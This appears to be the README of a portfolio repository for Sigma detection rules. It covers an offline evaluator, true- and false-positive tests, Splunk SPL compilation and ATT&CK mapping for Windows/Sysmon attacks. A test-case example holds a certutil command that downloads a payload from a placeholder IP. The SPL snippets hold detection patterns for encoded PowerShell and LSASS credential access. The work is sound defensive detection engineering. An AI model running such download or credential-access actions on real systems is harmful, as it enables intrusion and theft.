# Sigma Detection-as-Code

[![Python](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/)
[![Tests](https://img.shields.io/badge/tests-71%20passing-brightgreen.svg)](tests/)
[![Rules](https://img.shields.io/badge/Sigma%20rules-8-orange.svg)](docs/DETECTIONS.md)
[![Backend](https://img.shields.io/badge/compiles%20to-Splunk%20SPL-000000.svg?logo=splunk)](generated/splunk/)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-9%20techniques-red.svg)](generated/attack-navigator-layer.json)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

> Detection rules, managed like real software: version-controlled, unit-tested, and compiled to SPL by CI. Because "trust me, the rule works" is not a detection strategy.

---

## 📖 Overview

This repo treats Sigma rules the way engineers treat code - every rule is **validated**, **tested against labeled events**, and **compiled to a SIEM query automatically**. Push a change and CI tells you, in seconds, whether your rule still catches the attack it's supposed to and whether it started firing on something benign.

That last part is the bit most Sigma repos skip. Anyone can write a YAML file full of rules. The hard, valuable part of detection engineering is *proving* a rule does what it claims - and not flooding the SOC with false positives. So I built an offline Sigma evaluator and wired every rule up to **true-positive / false-positive test cases** that run in CI. No SIEM required.

I focused on **Windows + Sysmon** (process creation, registry, process access) because that's where most endpoint detection lives, and compiled everything to **Splunk SPL** since that's the stack I know best.

**What's in the box:**

- **8 Sigma rules** across Execution, Persistence, Defense Evasion, Credential Access, and C2 - mapped to **9 MITRE ATT&CK techniques**
- An **offline detection engine** that evaluates Sigma logic against sample events (the test harness)
- **TP/FP test cases** for every rule, run as a regression suite
- **One-command compilation** to Splunk SPL + a Splunk `savedsearches.conf`
- An auto-generated **MITRE ATT&CK Navigator layer** showing coverage
- **CI** that validates, tests, and compiles on every push (Python 3.10-3.12)

---

## 🏗️ The pipeline

```
   rules/windows/*.yml ─┐
                        │
              ┌─────────▼──────────┐   sigmatools validate
              │   1. VALIDATE      │   required fields, UUID, ATT&CK tag,
              │                    │   pySigma parses cleanly
              └─────────┬──────────┘
                        │
              ┌─────────▼──────────┐   pytest  (matcher.py engine)
              │   2. TEST          │   every rule must fire on its TRUE
              │   (TP / FP)        │   positives and stay silent on its
              │                    │   FALSE positives  ──► CI fails if not
              └─────────┬──────────┘
                        │
              ┌─────────▼──────────┐   sigmatools convert  (pySigma)
              │   3. COMPILE       │   ──► generated/splunk/*.spl
              │                    │   ──► savedsearches.conf
              └─────────┬──────────┘
                        │
              ┌─────────▼──────────┐   sigmatools coverage
              │   4. MAP COVERAGE  │   ──► ATT&CK Navigator layer JSON
              └────────────────────┘
```

The whole thing runs in [GitHub Actions](.github/workflows/ci.yml) on every push - so a rule change that breaks detection coverage turns the build red before it's ever merged.

---

## 🛡️ Detection coverage

| Rule | ATT&CK | Tactic | Level |
|------|--------|--------|-------|
| Encoded PowerShell Command Line | T1059.001, T1027 | Execution / Defense Evasion | high |
| Certutil Download via URLCache | T1105 | Command & Control | high |
| Rundll32 Executing JavaScript/VBScript | T1218.011 | Defense Evasion | high |
| Mshta Executing Remote Payload | T1218.005 | Defense Evasion | high |
| WMIC Process Call Create | T1047 | Execution | high |
| Scheduled Task Creation via schtasks | T1053.005 | Persistence | medium |
| Registry Run Key Persistence | T1547.001 | Persistence | medium |
| Suspicious LSASS Process Access | T1003.001 | Credential Access | high |

Full rule details and the compiled SPL for each are in [docs/DETECTIONS.md](docs/DETECTIONS.md). Drop [`generated/attack-navigator-layer.json`](generated/attack-navigator-layer.json) into the [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) to see the heatmap.

---

## 🚀 Quick start

```bash
pip install -e .

# Validate every rule (structure + pySigma parse)
python -m sigmatools validate

# Run the detection test suite (TP/FP regression)
pytest -q

# Compile all rules to Splunk SPL  -> generated/splunk/
python -m sigmatools convert

# Generate the MITRE ATT&CK Navigator layer
python -m sigmatools coverage
```

### Example: what compilation produces

The encoded-PowerShell rule compiles to:

```spl
Image IN ("*\\powershell.exe", "*\\pwsh.exe") OR OriginalFileName="PowerShell.EXE"
CommandLine IN ("* -enc *", "* -EncodedCommand *", "* -ec *")
```

And the LSASS credential-access rule, with its known-good exclusions:

```spl
TargetImage="*\\lsass.exe"
GrantedAccess IN ("0x1010", "0x1410", "0x1438", "0x143a", "0x1fffff")
NOT (SourceImage IN ("*\\wininit.exe", "*\\MsMpEng.exe", "*\\svchost.exe"))
```

---

## 🧪 Why the testing matters (the interesting part)

A Sigma rule is just a condition over fields. The question that matters is: **does it actually match the malicious behavior, and does it leave the benign behavior alone?**

Each rule has a companion file in [`tests/cases/`](tests/cases/) with `positive` events (the attack - must fire) and `negative` events (look-alike benign activity - must NOT fire). For example, the certutil rule's cases:

```yaml
positive:
  - Image: 'C:\Windows\System32\certutil.exe'
    CommandLine: 'certutil.exe -urlcache -split -f http://203.0.113.5/payload.exe p.exe'
negative:
  - Image: 'C:\Windows\System32\certutil.exe'
    CommandLine: 'certutil.exe -hashfile C:\Users\dan\file.txt SHA256'   # benign
```

[`sigmatools/matcher.py`](sigmatools/matcher.py) is a from-scratch Sigma evaluator (field modifiers, wildcards, `and/or/not`, `N of them`, etc. - see its docstring for the supported subset) so these tests run **offline and deterministically**. That's the same discipline as true/false-positive testing in a real detection-engineering program, minus the SIEM bill.

---

## 📂 Repository structure

```
sigma-detection-as-code/
├── rules/windows/            # the Sigma rules (YAML)
├── tests/
│   ├── cases/                # TP/FP sample events, one file per rule
│   ├── test_matcher.py       # unit tests for the detection engine
│   ├── test_rules_valid.py   # structure + pySigma convertibility
│   ├── test_detections.py    # TP/FP regression for every rule
│   └── test_convert.py       # SPL compilation smoke tests
├── sigmatools/
│   ├── matcher.py            # offline Sigma evaluator (the test engine)
│   ├── loader.py             # load rules + their test cases
│   ├── validate.py           # rule validation
│   ├── convert.py            # pySigma -> Splunk SPL
│   ├── coverage.py           # rules -> ATT&CK Navigator layer
│   └── cli.py                # validate / convert / coverage
├── generated/                # committed build output (SPL + ATT&CK layer)
│   ├── splunk/*.spl + savedsearches.conf
│   └── attack-navigator-layer.json
├── docs/DETECTIONS.md        # full catalog + compiled SPL
├── .github/workflows/ci.yml  # validate + test + compile on every push
└── pyproject.toml · Makefile · LICENSE · .gitignore
```

---

## ➕ Adding a rule

1. Drop a Sigma YAML in `rules/windows/` (include `id`, an `attack.tXXXX` tag, and a `level`).
2. Add a `tests/cases/<same-filename>.yml` with at least one `positive` and one `negative` event.
3. `python -m sigmatools validate && pytest -q` - green means it's well-formed and behaves.
4. `python -m sigmatools convert` to regenerate the SPL.

CI enforces steps 1-3 on every push.

---

## ⚠️ Note

These rules are written for learning and lab use against Sysmon-style telemetry. Tune thresholds, exclusions, and field names to your own environment before deploying - every network's "normal" is different, and an untuned rule is just a false-positive generator.

---

## 📄 License

MIT - see [LICENSE](LICENSE). Built as part of my [CyberSecurity Portfolio](https://github.com/DMYourz/CyberSecurity-Portfolio).
